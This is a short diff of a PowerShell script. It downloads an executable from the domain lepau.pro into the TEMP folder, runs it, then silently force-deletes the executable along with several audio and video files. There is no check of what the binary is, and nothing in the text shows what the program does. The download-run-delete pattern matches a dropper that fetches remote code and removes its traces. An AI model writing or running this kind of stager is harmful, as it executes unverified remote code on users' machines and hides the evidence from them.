@@ -1,4 +1,19 @@
 $exe = "$env:TEMP\virtualend.exe"
 iwr lepau.pro/virtualend.exe -OutFile $exe
-$p = Start-Process $exe -Wait -PassThru
-Remove-Item $exe -Force
+
+# Run and wait for it to finish
+Start-Process $exe -Wait
+
+# Double cleanup: delete all possible output files just in case
+$files = @(
+    "$PSScriptRoot\input.mp4",
+    "$PSScriptRoot\audio.wav",
+    "$env:TEMP\input.mp4",
+    "$env:TEMP\audio.wav"
+)
+foreach ($f in $files) {
+    if (Test-Path $f) { Remove-Item $f -Force -ErrorAction SilentlyContinue }
+}
+
+# Remove the EXE itself
+Remove-Item $exe -Force -ErrorAction SilentlyContinue
